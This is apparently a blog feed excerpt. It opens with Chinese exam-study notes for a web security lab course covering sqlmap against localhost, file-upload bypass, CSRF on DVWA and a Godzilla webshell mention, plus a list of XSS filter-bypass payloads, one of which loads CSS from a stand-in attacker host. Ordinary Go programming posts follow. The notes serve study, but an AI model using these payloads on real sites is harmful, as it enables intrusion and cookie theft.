sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1” --current-user

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;实操&#34;&gt;实操&lt;/h2&gt;
&lt;h3 id=&#34;sql注入&#34;&gt;SQL注入&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1BoP8zCuAYZvGmVxFBFtKwGdJB29VHF9RfnkThf-WDoM/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。&lt;/p&gt;
&lt;p&gt;SQL注入漏洞的产生需要满足以下两个条件：
1、参数用户可控：前端传给后端的参数内容是用户可以控制的。
2、参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询&lt;/p&gt;
&lt;h4 id=&#34;考点&#34;&gt;考点&lt;/h4&gt;
&lt;p&gt;虚拟机下完成union boolean 报错注入
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-81e503bcb28b41128b1162536612347e.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-5a6640925c8c4076a3049f7b750a909f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;文件上传&#34;&gt;文件上传&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1XUfC7W_sLhVOxO8n_CksYJIxchn31_TatbjwG_JTHKk/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站的权限，或者进一步危害服务器&lt;/p&gt;
&lt;h4 id=&#34;js绕过&#34;&gt;js绕过&lt;/h4&gt;
&lt;p&gt;原因：这种情况只是对&lt;code&gt;http head&lt;/code&gt;中的&lt;code&gt;Content-Type&lt;/code&gt;字段进行限制
方案：此时只需要使用&lt;code&gt;burpsuite&lt;/code&gt;啥的把Content-Type改了&lt;/p&gt;
&lt;h4 id=&#34;图马绕过&#34;&gt;图马绕过&lt;/h4&gt;
&lt;p&gt;原因：服务端对文件进行了检测
方案：&lt;del&gt;他没给，肯定不考&lt;/del&gt;&lt;/p&gt;
&lt;h4 id=&#34;考点-1&#34;&gt;考点&lt;/h4&gt;
&lt;p&gt;文件上传&amp;ndash;js检测绕过漏洞
文件后缀(改名)
文件类型绕过(burpsuite改Content-Type)&lt;/p&gt;
&lt;h3 id=&#34;暴力破解&#34;&gt;暴力破解&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1Bs7VGNWOsRhZp1QTU4QG48VBut20a86tOY1KfSuNy2M/edit?usp=sharing&#34;&gt;ppt&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
&lt;p&gt;在Web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击一将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。
XSS的基本实现思路很简单：比如持久型XSS通过一些正常的站内交互途径，例如发布评论，提交含有Javascript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。&lt;/p&gt;
&lt;h4 id=&#34;考点-2&#34;&gt;考点&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;XSS反射型/存储型
方法一:用&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;标签代替&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;
&lt;code&gt;&amp;lt;img src=1 onerror=alert(&#39;xss&#39;)&amp;gt;&lt;/code&gt;
方法二:双写绕过&lt;code&gt;&amp;lt;s&amp;lt;script&amp;gt;cript&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;
方法三:大小写绕过
&lt;code&gt;&amp;lt;ScRipt&amp;gt;alert(&#39;xss&#39;)&amp;lt;/ScRipt&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DOM型
&lt;code&gt;?default=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;上面不行，试试下面的&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;第一类：Javascript URL

&amp;lt;a href=&amp;quot;javascript:alert(&#39;test&#39;)&amp;quot;&amp;gt;link&amp;lt;/a&amp;gt;

&amp;lt;a href=&amp;quot;java&amp;amp;#115;cript:alert(&#39;xss&#39;)&amp;quot;&amp;gt;link&amp;lt;/a&amp;gt;

&amp;lt;iframe src=javascript:alert(&#39;xss&#39;)&amp;gt;

第二类：Inline style

&amp;lt;div style=&amp;quot;color: expression(alert(&#39;XSS&#39;))&amp;quot;&amp;gt;

&amp;lt;div style=color:expression\(alert(1))&amp;gt;&amp;lt;/div&amp;gt;

第三类：JavaScript 事件

&amp;lt;img src=1 onclick=alert(&#39;xss&#39;)&amp;gt;

&amp;lt;img src=1 onerror=alert(&#39;xss&#39;)&amp;gt;

&amp;lt;body onload=alert(&#39;xss&#39;)&amp;gt;

第四类：Script标签

&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;

&amp;lt;script&amp;gt;window.location=&#39;http://www.163.com&#39;&amp;lt;/script&amp;gt;

&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/scr&amp;lt;script&amp;gt;ipt&amp;gt;

&amp;lt;SCRIPT&amp;gt;alert(&#39;xss&#39;)&amp;lt;/SCRIPT&amp;gt;

第五类：CSS import

&amp;lt;style&amp;gt;@import url(&amp;quot;http://attacker.org/malicious.css&amp;quot;);&amp;lt;/style&amp;gt;

&amp;lt;style&amp;gt;@imp\ort url(&amp;quot;http://attacker.org/malicious.css&amp;quot;);&amp;lt;/style&amp;gt;

&amp;lt;STYLE&amp;gt;@im\port&#39;\ja\vasc\ript:alert(&amp;quot;XSS&amp;quot;)&#39;;&amp;lt;/STYLE&amp;gt;

&amp;lt;STYLE&amp;gt;@import&#39;http://jb51.net/xss.css&#39;;&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;csrf--原理&#34;&gt;CSRF  原理&lt;/h3&gt;
&lt;p&gt;CSRF( Cross- site request forgery,跨站请求伪造)也被称为 One ClickAttackt或者 Session Riding,通常缩写为CSRF或者XSRF,是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS),但它与XSs非常不同，XSS利用站点内的信任用户而CSRF通过你装成受信任用户请求受信任的网站。与XSS攻击相比CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。&lt;/p&gt;
&lt;p&gt;攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全。&lt;/p&gt;
&lt;h4 id=&#34;考点-3&#34;&gt;考点&lt;/h4&gt;
&lt;p&gt;虚拟机下CSRF攻击&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;简单的话
构建响应的url，
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=45&amp;amp;password_conf=45&amp;amp;Change=Change#
在本浏览器新建页面后进去构建好的url，页面显示密码修改成功。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;中等的话
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-5176172a38b24276947c3a14945a2a64.png&#34; alt=&#34;image.png&#34;&gt;
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-0deae3d355b0474c809a8a2e5e3dc52c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;杂项&#34;&gt;杂项&lt;/h2&gt;
&lt;p&gt;哥斯拉木马的使用，远程控制，远程控制机上上传文件生成一个用户&lt;/p&gt;
&lt;p&gt;Php代码理解，分析漏洞&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络安全形式
（通过什么方法防范什么问题达到什么效果）通过采取必要措施，防范对网络的攻击、入侵、干扰、破坏和非法使用以及意外事故，使网络处于可靠运行的状态，以及保障网络的存储，传输，处理信息的完整性，保密性，可用性的能力。
网络安全：网络运行（服务器崩溃）+网络信息安全&lt;/li&gt;
&lt;li&gt;网络安全渗透  攻击  网页篡改  远程攻击
渗透过程（流程图会画）
踩点  提权
检索方式:site inurl&lt;/li&gt;
&lt;li&gt;网络安全  渗透工程师  职业&lt;/li&gt;
&lt;li&gt;开发  大数据&lt;/li&gt;
&lt;li&gt;SQL注入  Union boolean  报错信息
Union  函数  -版本号（目的：漏洞  利用）
Boolean  &amp;ndash;(yes/no) 枚举  报错信息&lt;/li&gt;
&lt;li&gt;登录  查询&lt;/li&gt;
&lt;li&gt;SQL语句  标准  常规  异类&lt;/li&gt;
&lt;li&gt;库、表、字段&amp;mdash;&amp;gt; 管理  系统表 &amp;ndash;&amp;gt; 加密存储&lt;/li&gt;
&lt;li&gt;工具
bs&lt;br&gt;
sqlmap
nmap&lt;/li&gt;
&lt;li&gt;bs&amp;mdash;proxy代理（浏览器）  发出请求  响应response  扫描scanner&lt;br&gt;
拦截  篡改  钓鱼  代理
暴力破解（密码字典  原理   工具）&lt;/li&gt;
&lt;li&gt;html静态 交互
部署   php使用&amp;mdash;数据库增删改查IDUS   服务(sqldemo） index.php&lt;/li&gt;
&lt;li&gt;xss
js  php
交互   对话框
反射型  存储型  脚本  执行
dom型&lt;/li&gt;
&lt;li&gt;文件上传&lt;/li&gt;
&lt;li&gt;哥斯拉&amp;mdash;做木马  php
绕过 Js
文件类型  绕过
文件后缀  绕过
远程控制&lt;/li&gt;
&lt;li&gt;IP端口  URL   &amp;mdash;&amp;gt;网络&lt;/li&gt;
&lt;li&gt;靶机  物理机  （必考）&lt;/li&gt;
&lt;li&gt;test.sql上传数据库  导入数据&lt;/li&gt;
&lt;li&gt;CSRF&lt;/li&gt;
&lt;li&gt;KALI   msf   ms&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>awesome way to make use of nil channel</title>
      <link>https://resyon.github.io/posts/awesome-nil-channel/</link>
      <pubDate>Wed, 08 Dec 2021 20:45:20 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/awesome-nil-channel/</guid>
      <description>Awesome way to make use of nil channel common Send and receive operations on a nil channel block forver. It&amp;rsquo;s a well documented behavior
package main import ( &amp;#34;fmt&amp;#34; ) func main() { var ch chan int go func() { fmt.Println(&amp;#34;ready to read from ch&amp;#34;) fmt.Printf(&amp;#34;get val: %v\n&amp;#34;, &amp;lt;-ch) }() fmt.Println(&amp;#34;ready to write val to ch&amp;#34;) ch &amp;lt;- 17 } got output awesome usage This behavior can be used as a way to dynamically enable and disable case blocks in a select statement.</description>
      <content>&lt;h1 id=&#34;awesome-way-to-make-use-of-nil-channel&#34;&gt;Awesome way to make use of &lt;code&gt;nil&lt;/code&gt; channel&lt;/h1&gt;
&lt;h2 id=&#34;common&#34;&gt;common&lt;/h2&gt;
&lt;p&gt;Send and receive operations on a nil channel block forver. It&amp;rsquo;s a well documented behavior&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
)

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;

	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ready to read from ch&amp;#34;&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get val: %v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;)
	}()
	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ready to write val to ch&amp;#34;&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;got output
&lt;img src=&#34;https://resyon.github.io/upload/2021/12/image-91291c0c90e24bb4b012c102129be6cd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;awesome-usage&#34;&gt;awesome usage&lt;/h2&gt;
&lt;p&gt;This behavior can be used as a way to dynamically enable and disable case blocks in a select statement.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt;(
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;
)

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;inch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;outch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
	&lt;span style=&#34;color:#75715e&#34;&gt;// (0) `in != nil`
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;inch&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
	    &lt;span style=&#34;color:#75715e&#34;&gt;// enable and disable `out`, `in`
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; {
	    &lt;span style=&#34;color:#75715e&#34;&gt;// (1)(3) out == nil =&amp;gt; { blocking }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;// (2)(4) out != nil =&amp;gt; { out &amp;lt;- val; in != nil } 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;:
                &lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
                &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;inch&lt;/span&gt;

	    &lt;span style=&#34;color:#75715e&#34;&gt;// (1)(3) in != nil =&amp;gt; { out != nil; val &amp;lt;- in; in == nil }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	    &lt;span style=&#34;color:#75715e&#34;&gt;// (2)(4) in == nil =&amp;gt; { blocking }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt;:
                &lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;outch&lt;/span&gt;
                &lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
            }
        }
    }()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
	&lt;span style=&#34;color:#75715e&#34;&gt;// (1) blocking
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// (2) result: 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// (3) blocking
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// (4) result: 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;outch&lt;/span&gt; {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;result:&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;r&lt;/span&gt;)
        }
    }()

    &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;inch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;inch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ref&#34;&gt;ref&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/index.html&#34;&gt;http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/index.html&lt;/a&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>How does go calculate a hash value for keys in a map?</title>
      <link>https://resyon.github.io/posts/go-map-calculate-hash-value/</link>
      <pubDate>Sun, 10 Oct 2021 15:27:19 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/go-map-calculate-hash-value/</guid>
      <description>How does go calculate a hash value for keys in a map?  ref
 original   The language spec doesn&amp;rsquo;t say, which means that it&amp;rsquo;s free to change at any time, or differ between implementations.
  The hash algorithm varies somewhat between types and platforms. As of now: On x86 (32 or 64 bit) if the CPU supports AES instructions, the runtime uses aeshash, a hash built on AES primitives, otherwise it uses a function &amp;ldquo;inspired by&amp;rdquo; xxHash and cityhash, but different from either.</description>
      <content>&lt;h1 id=&#34;how-does-go-calculate-a-hash-value-for-keys-in-a-map&#34;&gt;How does go calculate a hash value for keys in a map?&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/37625480/how-does-go-calculate-a-hash-value-for-keys-in-a-map&#34;&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;original&#34;&gt;original&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The language spec doesn&amp;rsquo;t say, which means that it&amp;rsquo;s free to change at any time, or differ between implementations.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The hash algorithm varies somewhat between types and platforms. As of now: On x86 (32 or 64 bit) if the CPU supports AES instructions, the runtime uses aeshash, a hash built on AES primitives, otherwise it uses a function &amp;ldquo;inspired by&amp;rdquo; xxHash and cityhash, but different from either. There are different variants for 32-bit and 64-bit systems. Most types use a simple hash of their memory contents, but floating-point types have code to ensure that 0 and -0 hash equally (since they compare equally) and NaNs hash randomly (since two NaNs are never equal). Since complex types are built from floats, their hashes are composed from the hashes of their two floating-point parts. And an interface&amp;rsquo;s hash is the hash of the value stored in the interface, and not the interface header itself.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All of this stuff is in private functions, so no, you can&amp;rsquo;t access Go&amp;rsquo;s internal hash for a value in your own code.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;if two things compare equal with == they must have equal hashes (or maps wouldn&amp;rsquo;t work&amp;hellip; this is also the reasoning behind all of the special cases I outlined above). That means that strings hash their bodies, not their headers. And structs compose the hashes of all of their fields. I can&amp;rsquo;t find the code actually implementing that, but the tests and the comparison rules make it clear.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;平台/体系结构相关, &lt;code&gt;func hash&lt;/code&gt;绑定至&lt;code&gt;_type.alg&lt;/code&gt;中, &lt;code&gt;x86&lt;/code&gt;下且支持&lt;code&gt;AES&lt;/code&gt;指令使用基于&lt;code&gt;AES&lt;/code&gt;原语的&lt;code&gt;aeshash&lt;/code&gt;, 否则&amp;hellip;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;float&lt;/code&gt;的计算方式比较特殊, 由于&lt;code&gt;IEEE-754&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;interface&lt;/code&gt;的哈希根据存储其中的&lt;code&gt;hash value&lt;/code&gt;计算出, 而非头部&lt;/li&gt;
&lt;li&gt;&lt;code&gt;string&lt;/code&gt;, &lt;code&gt;struct&lt;/code&gt; 的哈希值由构成他们的域/字符计算得出, 而非头部&lt;/li&gt;
&lt;li&gt;&lt;code&gt;golang&lt;/code&gt;定义的&lt;code&gt;hash&lt;/code&gt;均为私有, 但可以通过&lt;code&gt;==&lt;/code&gt;推断二者的&lt;code&gt;hash value&lt;/code&gt;是否相等, &lt;a href=&#34;https://golang.org/ref/spec#Comparison_operators&#34;&gt;但注意 &lt;code&gt;slice&lt;/code&gt;, &lt;code&gt;map&lt;/code&gt;, &lt;code&gt;func&lt;/code&gt;, &lt;code&gt;带有前面3者的array &amp;amp;&amp;amp; struct&lt;/code&gt;不可比较&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>golang nil interface</title>
      <link>https://resyon.github.io/posts/golang-nil-interface/</link>
      <pubDate>Sat, 09 Oct 2021 17:47:39 +0800</pubDate>
      
      <guid>https://resyon.github.io/posts/golang-nil-interface/</guid>
      <description>golang nil interface  ref
 preparation: structure of interface entry common interface type iface struct { tab *itab data unsafe.Pointer } type itab struct { inter *interfacetype _type *_type link *itab hash uint32 // copy of _type.hash. Used for type switches. 	bad bool // type does not implement interface 	inhash bool // has this itab been added to hash? 	unused [2]byte fun [1]uintptr // variable sized } type interfacetype struct { typ _type pkgpath name mhdr []imethod } interface{} type eface struct { _type *_type data unsafe.</description>
      <content>&lt;h1 id=&#34;golang-nil-interface&#34;&gt;golang nil interface&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://golang.design/go-questions/interface/dynamic-typing/&#34;&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;preparation-structure-of-interface-entry&#34;&gt;preparation: structure of interface entry&lt;/h2&gt;
&lt;h3 id=&#34;common-interface&#34;&gt;common interface&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iface&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;tab&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;itab&lt;/span&gt;
